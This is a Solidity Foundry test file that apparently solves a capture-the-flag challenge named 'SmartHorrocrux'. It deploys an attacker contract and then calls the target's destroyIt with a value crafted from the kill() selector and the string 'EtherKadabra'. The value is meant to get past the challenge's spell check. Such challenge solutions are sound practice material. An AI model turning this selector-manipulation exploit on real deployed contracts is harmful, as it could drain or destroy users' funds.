// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SmartHorrocrux.sol";
import "../src/attackers/SmartHorrocruxAttacker.sol";

contract SmartHorrocruxTest is Test {
    SmartHorrocrux public target;
    address public targetAddress;
    address public player;

    function setUp() public {
        target = new SmartHorrocrux{value: 2}();
        targetAddress = address(target);
        player = vm.addr(1);

        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testSmartHorrocrux() public {
        vm.startPrank(player, player);

        (bool success, ) = address(target).call("");
        new SmartHorrocruxAttacker{value: 1}(targetAddress);
        target.setInvincible();

        string memory spell = "EtherKadabra";

        bytes32 spellInBytes;
        assembly {
            spellInBytes := mload(add(spell, 32))
        }

        //bytes memory kedavra = abi.encodePacked(
        //   bytes4(bytes32(uint256(spellInBytes) - magic))
        //);

        bytes memory expected = abi.encodePacked(bytes4(keccak256("kill()")));

        uint256 result = uint256(
            bytes32(
                uint256(bytes32(expected)) +
                    uint256(
                        bytes32(
                            abi.encodePacked(
                                bytes4(bytes32(uint256(spellInBytes)))
                            )
                        )
                    )
            )
        );

        target.destroyIt("EtherKadabra", result);

        assertTrue(target.alive());

        vm.stopPrank();
    }
}
